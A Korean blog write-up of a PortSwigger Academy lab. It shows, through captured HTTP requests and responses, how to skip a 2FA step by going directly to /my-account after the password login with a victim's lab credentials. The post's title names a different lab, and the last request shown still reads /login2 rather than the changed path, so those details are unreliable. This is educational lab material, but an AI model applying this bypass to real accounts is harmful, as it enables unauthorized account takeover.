---
layout: post
title: "Burp Academy-인증(Authentication) 취약점: Username enumeration via different responses"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, 인증취약점]
toc: true
---

# 개요
- 인증(Authentication)에 관련된 취약점이다. 
- 취약점 설명 주소: https://portswigger.net/web-security/authentication/multi-factor
- 문제 주소: : https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass
- 난이도: APPRENTICE (쉬움)

# 문제 설명
- 2FA가 구현되어 있긴 하지만 취약하다. 첫번째 인증을 한 후에, 바로 인증후 화면에 접근하는 것으로 우회할 수 있다. 

```
This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.

Your credentials: wiener:peter
Victim's credentials carlos:montoya
```

# 로그인 과정 관찰
## 1차 인증
주어진 ID와 비밀번호로 로그인한다. 로그인에 성공하면 /login2로 리다이렉트된다. 

```http
POST /login HTTP/2
Host: 0a570061049085d282fda6be00d3001f.web-security-academy.net
Cookie: session=ce40xcBlbIA8lwEYbtFxmIToeriR74a0
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a570061049085d282fda6be00d3001f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a570061049085d282fda6be00d3001f.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

username=wiener&password=peter
```

```
HTTP/2 302 Found
Location: /login2
Set-Cookie: session=xJhnWbYCf9cGdbS9o13kpwnOY6tpv7TB; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

GET /login2로 요청하면 이메일로 전송된 네자리 인증코드를 입력하라는 화면이 회신된다. 


## 2차 인증
이메일에서 인증코드를 확인하고 2차 인증을 시도하면 다음과 같은 요청/응답이 발생한다.  

```http
POST /login2 HTTP/2
Host: 0a570061049085d282fda6be00d3001f.web-security-academy.net
Cookie: session=xJhnWbYCf9cGdbS9o13kpwnOY6tpv7TB
Content-Length: 13
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a570061049085d282fda6be00d3001f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a570061049085d282fda6be00d3001f.web-security-academy.net/login2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

mfa-code=0864
```

```
HTTP/2 302 Found
Location: /my-account
Set-Cookie: session=G18oFYiVd1HIxhemLxNbM8BWIt6ndp5X; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

# 2차 인증 우회하기 
1차 인증을 완료한 후에 바로 /my-account로 접속하는 것으로 2차 인증을 우회할 수 있을 것 같다. victim 계정으로 1차 인증을 하고, 2차 인증을 우회해본다. 

## 1차 인증 
carlos:montoya로 로그인한다. 

```
POST /login HTTP/2
Host: 0a570061049085d282fda6be00d3001f.web-security-academy.net
Cookie: session=8KGsSFUAe0LkBZQikcsqQjdJppNNfWw5
Content-Length: 32
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a570061049085d282fda6be00d3001f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a570061049085d282fda6be00d3001f.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

username=carlos&password=montoya
```

2차인증 페이지로 이동하라고 회신된다. 
```
HTTP/2 302 Found
Location: /login2
Set-Cookie: session=x3OR2hBVklliP16ntze4tF7dWIGp3kgK; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

## 어카운트 정보 페이지로 이동

GET /login2 요청을 캡쳐해서 경로를 /my-account로 변경한다. 

```
GET /login2 HTTP/2
Host: 0a570061049085d282fda6be00d3001f.web-security-academy.net
Cookie: session=x3OR2hBVklliP16ntze4tF7dWIGp3kgK
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Referer: https://0a570061049085d282fda6be00d3001f.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7


```

그러면 다음과 같이 carlos 계정으로 로그인이 성공한 것을 알 수 있다. 

![calor계정 로그인 성공](/images/burp-academy-authn-2-1.png)

이 상태에 우측 상단에 있는 My account를 클릭한다. 

그러면 GET /my-account?id=carlos 요청이 발생하고 문제 풀이에 성공했다는 메세지가 출력된다. 

![문제 풀이 성공](/images/burp-academy-authn-2-success.png)